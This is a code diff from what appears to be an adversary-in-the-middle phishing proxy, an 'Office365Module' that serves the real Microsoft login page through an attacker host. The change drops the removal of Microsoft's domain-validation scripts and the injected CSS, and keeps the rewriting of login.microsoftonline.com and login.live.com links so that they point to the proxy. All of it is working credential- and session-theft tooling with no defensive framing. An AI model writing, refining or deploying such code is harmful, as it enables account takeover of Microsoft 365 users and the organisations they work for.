@@ -941,27 +941,15 @@ class Office365Module(BaseModule):
             
             if resp.headers.get('content-type', '').startswith('text/html'):
                 try:
-                    # Decode content and serve the REAL Microsoft page (as intended for AiTM)
+                    # Decode content and serve the REAL Microsoft page with MINIMAL changes
                     content_str = content.decode('utf-8', errors='ignore')
                     current_host = flask_request.host
                     
                     # Log content size for debugging  
                     self.log(f"[AiTM] Processing REAL Microsoft HTML content, size: {len(content_str)} chars")
                     
-                    # TARGETED fixes for the real Microsoft page without breaking structure
-                    import re
-                    
-                    # 1. Remove only problematic scripts that cause domain validation
-                    problematic_scripts = [
-                        r'<script[^>]*src="[^"]*login[^"]*\.js[^"]*"[^>]*></script>',
-                        r'<script[^>]*>.*?window\.location\.hostname.*?</script>',
-                        r'<script[^>]*>.*?domain.*?validation.*?</script>',
-                    ]
-                    
-                    for pattern in problematic_scripts:
-                        content_str = re.sub(pattern, '', content_str, flags=re.DOTALL | re.IGNORECASE)
-                    
-                    # 2. Replace Microsoft URLs with our proxy URLs
+                    # MINIMAL APPROACH: Only replace Microsoft URLs with proxy URLs
+                    # No CSS forcing, no script removal - let Microsoft handle everything!
                     replacements = [
                         ('https://login.microsoftonline.com/', f'https://{current_host}/proxy/'),
                         ('https://login.live.com/', f'https://{current_host}/proxy/'),
@@ -979,20 +967,8 @@ class Office365Module(BaseModule):
                     for old_url, new_url in replacements:
                         content_str = content_str.replace(old_url, new_url)
                     
-                    # 3. Add minimal CSS to ensure visibility
-                    visibility_css = '''
-<style>
-/* Ensure critical elements are visible */
-body, html { background-color: #f5f5f5 !important; min-height: 100vh !important; }
-[style*="display: none"] { display: block !important; }
-.login-container, .login-box, .login-form, #lightbox { display: block !important; visibility: visible !important; }
-</style>'''
-                    
-                    # Insert before closing </head>
-                    content_str = content_str.replace('</head>', visibility_css + '</head>', 1)
-                    
                     content = content_str.encode('utf-8')
-                    self.log(f"[AiTM] Serving REAL Microsoft page with targeted fixes, rewrote {len(replacements)} URL patterns")
+                    self.log(f"[AiTM] Serving REAL Microsoft page with MINIMAL URL rewriting only")
                     
                     # Update Content-Length header
                     response_headers['Content-Length'] = str(len(content))
